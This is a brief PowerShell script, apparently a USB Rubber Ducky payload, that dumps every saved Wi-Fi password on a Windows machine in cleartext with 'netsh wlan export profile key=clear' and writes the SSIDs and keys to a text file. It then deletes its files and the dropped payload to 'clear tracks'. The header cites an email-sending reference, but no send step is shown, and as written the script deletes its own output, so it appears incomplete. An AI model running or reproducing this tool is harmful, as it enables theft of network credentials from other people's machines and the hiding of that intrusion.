<#
this script can be found at 
https://github.com/axel05869/Wifi-Grab

---------------------REFERENCE:----------------------
https://github.com/exploitechx/wifi-password-extractor
http://adamringenberg.com/powershell2/send-mailmessage
#>


# All the files will be saved in this directory
$p = "C:\wipass"
mkdir $p
cd $p


# Get all saved wifi password
netsh wlan export profile key=clear
dir *.xml |% {
$xml=[xml] (get-content $_)
$a= "========================================`r`n SSID = "+$xml.WLANProfile.SSIDConfig.SSID.name + "`r`n PASS = " +$xml.WLANProfile.MSM.Security.sharedKey.keymaterial
Out-File wifipass.txt -Append -InputObject $a
}



# Clear tracks
rm *.xml
rm *.txt
cd ..
rm wipass


# remove ducky payload
rm d.ps1
